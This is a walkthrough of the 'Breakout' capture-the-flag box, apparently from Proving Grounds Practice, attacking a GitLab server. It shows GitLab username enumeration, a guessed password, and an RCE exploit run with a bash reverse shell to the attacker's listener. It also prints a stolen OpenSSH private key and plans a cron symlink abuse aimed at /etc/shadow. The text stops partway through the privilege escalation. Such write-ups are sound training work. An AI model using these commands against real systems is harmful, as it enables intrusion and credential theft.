### Breakout Proving Grounds Practice

### Difficulty = Intermediate

### IP Address = 192.168.168.182

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ nmap -sCV -A 192.168.168.182 -p22,80 -oN nmapscan   
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 23:00 WAT
Nmap scan report for 192.168.168.182
Host is up (0.68s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
|_/*/new /*/edit /*/raw
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://192.168.168.182/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.31 seconds

```

Lets check the web server on port 80 out

Its running an instance of gitlab
![image](https://user-images.githubusercontent.com/113513376/214960058-14a14c29-a21f-4a7c-8905-6360fd342f32.png)

Since i don't have any username to authenticate as 

I'll create an account as it allows creation of account
![image](https://user-images.githubusercontent.com/113513376/214960380-ee291ea5-82df-4dd8-b28c-fb8960dace5b.png)

```
Username: pwner
Email: pwner@localhost.com
Password: hackerpwner
```


I tried logging in but it says its under approval
![image](https://user-images.githubusercontent.com/113513376/214963501-88947f4a-64e4-4975-9c5a-52b058c40bc1.png)

So we need to find a way to get logged in as a valid user

Luckily for us gitlab can be abused to perfrom username enumeration in the register function
![image](https://user-images.githubusercontent.com/113513376/214963700-f0a9d1ce-5df1-468c-bb6b-282b316b736a.png)

But when i search `admin` its not a valid user on the gitlab instance
![image](https://user-images.githubusercontent.com/113513376/214963830-2bd3e81f-6cbf-4de0-871c-26f4ee903c84.png)


So i'll use a script which will perform the username enumeration

Here's the script i'll use [Userenum](https://www.exploit-db.com/exploits/49821)

Now lets check it out

Running it we see the arguments needed

```
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     GitLab User Enumeration Script
                            Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


usage: ./gitlab_user_enum.sh --url <URL> --userlist <Username Wordlist>

PARAMETERS:
-------------
-u/--url  The URL of your victim's GitLab instance
--userlist  Path to a username wordlist file (one per line)
-h/--help  Show this help message and exit


Example:
-------------
./gitlab_user_enum.sh --url http://gitlab.local/ --userlist /home/user/usernames.txt

The URL of your GitLab target (--url) is missing. 
```

So i'll pass in the arguments and a userlist

I used grep to filter the error http code and the `echo loop`
```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ bash userenum.sh --url http://192.168.168.182/ --userlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | grep -v "LOOP\|302"

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     GitLab User Enumeration Script
                            Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


200
[+] The username webmaster exists!
200
[+] The username root exists!
200
[+] The username michelle exists!

```

Now that we have valid users

I'll try loggin in as `michelle` using her name as the password also `michelle:michelle`
![image](https://user-images.githubusercontent.com/113513376/214967465-f05e2a14-7bbb-4182-bf3b-29af7e1bbb82.png)

Boom!!! It worked
![image](https://user-images.githubusercontent.com/113513376/214967520-d4cf963f-493f-4459-a2a5-d3ff077a489a.png)

Now searching google for a way to get shell leads to this remote code execution exploit [Exploit](https://www.exploit-db.com/exploits/49951)

So lets try it out 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ python3 exploit.py --help                                         
usage: exploit.py [-h] -u U -p P -c C -t T

GitLab < 13.10.3 RCE

options:
  -h, --help  show this help message and exit
  -u U        Username
  -p P        Password
  -c C        Command
  -t T        URL (Eg: http://gitlab.example.com)
```

Now we know the arguments to pass lets try it out then

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ python3 exploit.py -u michelle -p michelle -t http://192.168.168.182/ -c "bash -c 'bash -i >& /dev/tcp/192.168.45.5/1337 0>&1'"
[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
```

It hangs there but back on our listener we get a connection

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.168.182] 39226
bash: cannot set terminal process group (339): Inappropriate ioctl for device
bash: no job control in this shell
git@breakout:~/gitlab-workhorse$
```

So lets stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Cool now lets escalate priv

On checking the backups directory i see an idrsa file

```
git@breakout:~$ cd backups
cd backups
git@breakout:~/backups$ ls -al
ls -al
total 12
drwx------  2 git  root 4096 Mar  3  2022 .
drwxr-xr-x 20 root root 4096 Jan 23 09:40 ..
-rwxr-xr-x  1 root root 2602 Mar  3  2022 mykey
git@breakout:~/backups$ cat mykey
cat mykey
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
git@breakout:~/backups$ 
```

ID_RSA:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

But I have no idea for which user it belongs to 

Trying it on user michelle doesn't work

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ nano id_rsa  
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ chmod 600 id_rsa 
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ ssh -i id_rsa michelle@192.168.168.182        
michelle@192.168.168.182's password: 
```

So maybe there are other users on the box

We can get list of users in a gitlab instance using a valid api token

Here's how i created the token
![image](https://user-images.githubusercontent.com/113513376/214984619-0c7871fb-6420-41b7-a780-5f163c7baed1.png)

After creation we get something like this
![image](https://user-images.githubusercontent.com/113513376/214984776-a3d2489e-75a0-4143-a144-c11cefbb4772.png)

Now after reading gitlab docs [Docs](https://docs.gitlab.com/ee/api/users.html)

I learnt how to get the list of users

So i'll be using curl 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ curl http://192.168.168.182/api/v4/users?access_token=ifPaKz8yGPJmj2Ed4pJ2     
[{"id":4,"name":"Coaran","username":"coaran","state":"active","avatar_url":"https://www.gravatar.com/avatar/4d92c43788f35237750720daeeb6297a?s=80\u0026d=identicon","web_url":"http://breakout/coaran"},{"id":3,"name":"michelle","username":"michelle","state":"active","avatar_url":"https://www.gravatar.com/avatar/fcf53cd37c1f86e2b43f1db402f41f52?s=80\u0026d=identicon","web_url":"http://breakout/michelle"},{"id":2,"name":"webmaster","username":"webmaster","state":"active","avatar_url":"https://www.gravatar.com/avatar/92279a35ff837beb3ecc6ba7eeafb74e?s=80\u0026d=identicon","web_url":"http://breakout/webmaster"},{"id":1,"name":"Administrator","username":"root","state":"active","avatar_url":"https://www.gravatar.com/avatar/4924e448526fb188fd8e0c75d0dbb3bf?s=80\u0026d=identicon","web_url":"http://breakout/root"}] 
```

But it isn't really quite arranged 

And since the content type is json i'll use `jq` tool which will reform it in a better way

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ curl http://192.168.168.182/api/v4/users?access_token=ifPaKz8yGPJmj2Ed4pJ2 | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   815  100   815    0     0   1854      0 --:--:-- --:--:-- --:--:--  1856
[
  {
    "id": 4,
    "name": "Coaran",
    "username": "coaran",
    "state": "active",
    "avatar_url": "https://www.gravatar.com/avatar/4d92c43788f35237750720daeeb6297a?s=80&d=identicon",
    "web_url": "http://breakout/coaran"
  },
  {
    "id": 3,
    "name": "michelle",
    "username": "michelle",
    "state": "active",
    "avatar_url": "https://www.gravatar.com/avatar/fcf53cd37c1f86e2b43f1db402f41f52?s=80&d=identicon",
    "web_url": "http://breakout/michelle"
  },
  {
    "id": 2,
    "name": "webmaster",
    "username": "webmaster",
    "state": "active",
    "avatar_url": "https://www.gravatar.com/avatar/92279a35ff837beb3ecc6ba7eeafb74e?s=80&d=identicon",
    "web_url": "http://breakout/webmaster"
  },
  {
    "id": 1,
    "name": "Administrator",
    "username": "root",
    "state": "active",
    "avatar_url": "https://www.gravatar.com/avatar/4924e448526fb188fd8e0c75d0dbb3bf?s=80&d=identicon",
    "web_url": "http://breakout/root"
  }
]
```

Now we have the list of users i'll try loggin to ssh using each user 

After trying user `coaran` we're logged in

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ ssh -i id_rsa coaran@192.168.168.182  
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 27 Jan 2023 01:17:46 AM UTC

  System load:  0.06              Processes:                309
  Usage of /:   81.2% of 9.78GB   Users logged in:          0
  Memory usage: 79%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   3%                IPv4 address for ens160:  192.168.168.182


39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


*** System restart required ***

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

coaran@breakout:~$
```

Now lets find a way to escalate priv 

I'll upload pspy to the target to check for process running

```
2023/01/27 01:22:01 CMD: UID=0    PID=86232  | /usr/sbin/CRON -f 
2023/01/27 01:22:01 CMD: UID=0    PID=86234  | bash /opt/backups/backup.sh 
2023/01/27 01:22:01 CMD: UID=0    PID=86233  | /bin/sh -c bash /opt/backups/backup.sh 
```

We see a cron is running a script as root in the /opt/backups directory

And on checking the script 

```
coaran@breakout:/opt/backups$ ls
backup.sh  log_backup.zip
coaran@breakout:/opt/backups$ cat backup.sh 
/usr/bin/zip -r /opt/backups/log_backup.zip /srv/gitlab/logs/*
coaran@breakout:/opt/backups$
```

We see what it does 

```
1. It compresses the whole file in /srv/gitlab/logs/ to a single backup.zip file
```

We don't have permission to edit the script

But what we can do is this 

Create a symbolic link to a file in the `/srv/gitlab/logs` directory then when the cron runs it will zip the content of the files including the file we linked it to i.e `ln /etc/shadow file`

But unfortunately we don't have write access in that directory damn 🤧

```
coaran@breakout:~$ cd /srv/gitlab/logs/
coaran@breakout:/srv/gitlab/logs$ echo test > lol
-bash: lol: Permission denied
coaran@breakout:/srv/gitlab/logs$ 
```

Now if we remember we did have a user in the container who had read/write access over the gitlab directory

So i'll run the exploit and get shell as user `git`

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ python3 exploit.py -u michelle -p michelle -t http://192.168.168.182/ -c "bash -c 'bash -i >& /dev/tcp/192.168.45.5/1337 0>&1'"
[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
```

On the listener

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Breakout]
└─$ nc -lvnp 1337    
listening on [any] 1337 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.168.182] 39900
bash: cannot set terminal process group (339): Inappropriate ioctl for device
bash: no job control in this shell
git@breakout:~/gitlab-workhorse$ 
```

Follow the steps which we did previously to stabilize the reverse shell 

Now lets check if we have access to the directory

```
git@breakout:/etc/gitlab$ ls /srv -al
total 8
drwxr-xr-x 2 root root 4096 Jan 19  2021 .
drwxr-xr-x 1 root root 4096 Mar  3  2022 ..
git@breakout:/etc/gitlab$
```

Hmm nothing is there

So maybe it isn't really mounted in the same path

Lets check out whats mounted in this container

```
git@breakout:/etc/gitlab$ mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/P6MM3ZGGLY5NEE4VEHROFVT4YN:/var/lib/docker/overlay2/l/G4JXNQIFE7P5VVLEVIKNXKFKBA:/var/lib/docker/overlay2/l/SRZH7KOERQUBG6Q45PNMPH7ZY6:/var/lib/docker/overlay2/l/355O7TWU7XFQV2NFZQ2RGQRYVR:/var/lib/docker/overlay2/l/QV5R5YOOB4HIIOHUP4Z2OAYMAP:/var/lib/docker/overlay2/l/Q4UMANCVMLIOTA56TUPI5XPIGQ:/var/lib/docker/overlay2/l/BVU7LQXLDRR25S6IOOY6NRDGXV:/var/lib/docker/overlay2/l/UOYHQU37CUKGAR434NYS7Z42OE:/var/lib/docker/overlay2/l/NAHWTB25BLS56OONXJDSRQ3X3L:/var/lib/docker/overlay2/l/YCDZQ6CZGDFIIKXXWFPKPLK7MD,upperdir=/var/lib/docker/overlay2/d8ce9479e17ee91087febfe48cbb3bc889ce37f4e0bfcb3ba8116a5170efde4c/diff,workdir=/var/lib/docker/overlay2/d8ce9479e17ee91087febfe48cbb3bc889ce37f4e0bfcb3ba8116a5170efde4c/work,xino=off)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
/dev/sda2 on /etc/gitlab type ext4 (rw,relatime)
/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sda2 on /etc/hostname type ext4 (rw,relatime)
/dev/sda2 on /etc/hosts type ext4 (rw,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/sda2 on /var/log/gitlab type ext4 (rw,relatime)
/dev/sda2 on /var/opt/gitlab type ext4 (rw,relatime)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)
git@breakout:/etc/gitlab$ 
```

There are quite much but what is of interest to us is this 

```
/dev/sda2 on /var/log/gitlab type ext4 (rw,relatime)
/dev/sda2 on /var/opt/gitlab type ext4 (rw,relatime)
```

We see a directory is mounted on `/dev/sda2` 

Also checking the host target we see that the `/` path is `/dev/sda2`

```
coaran@breakout:/srv/gitlab/logs$ df
Filesystem     1K-blocks    Used Available Use% Mounted on
udev             1970112       0   1970112   0% /dev
tmpfs             403056    1244    401812   1% /run
/dev/sda2       10252564 8326944   1385104  86% /
tmpfs            2015276       0   2015276   0% /dev/shm
tmpfs               5120       0      5120   0% /run/lock
tmpfs            2015276       0   2015276   0% /sys/fs/cgroup
/dev/loop2         69632   69632         0 100% /snap/lxd/22526
/dev/loop4         63360   63360         0 100% /snap/core20/1242
/dev/loop1         63488   63488         0 100% /snap/core20/1361
/dev/loop3         68864   68864         0 100% /snap/lxd/21835
/dev/loop0         56832   56832         0 100% /snap/core18/2253
/dev/loop6         44672   44672         0 100% /snap/snapd/14978
/dev/loop5         56960   56960         0 100% /snap/core18/2284
tmpfs             403052       0    403052   0% /run/user/1000
```

This is good cause the `/srv/gitlab/logs` is mounted on `/var/log/gitlab`

Now lets see if the user has write access over the directory

```
git@breakout:/$ cd /var/log/gitlab/
git@breakout:/var/log/gitlab$ ls -al
total 80
drwxr-xr-x 20 root              root       4096 Mar  3  2022 .
drwxr-xr-x  1 root              root       4096 Feb 23  2021 ..
drwx------  2 gitlab-prometheus root       4096 Jan 26 23:12 alertmanager
drwx------  2 git               root       4096 Jan 27 00:59 gitaly
drwx------  2 git               root       4096 Jan 26 23:08 gitlab-exporter
drwx------  2 git               root       4096 Jan 27 01:30 gitlab-rails
drwx------  2 git               root       4096 Mar  3  2022 gitlab-shell
drwx------  2 git               root       4096 Jan 26 23:09 gitlab-workhorse
drwx------  2 gitlab-prometheus root       4096 Jan 26 23:12 grafana
drwx------  2 root              root       4096 Jan 23 09:40 logrotate
drwxr-x---  2 root              gitlab-www 4096 Jan 27 00:59 nginx
drwx------  2 gitlab-psql       root       4096 Jan 26 23:12 postgres-exporter
drwx------  2 gitlab-psql       root       4096 Jan 26 23:12 postgresql
drwx------  2 gitlab-prometheus root       4096 Jan 26 23:08 prometheus
drwx------  2 git               root       4096 Jan 27 00:59 puma
drwxr-xr-x  2 root              root       4096 Jan 23 09:39 reconfigure
drwx------  2 gitlab-redis      root       4096 Jan 26 23:08 redis
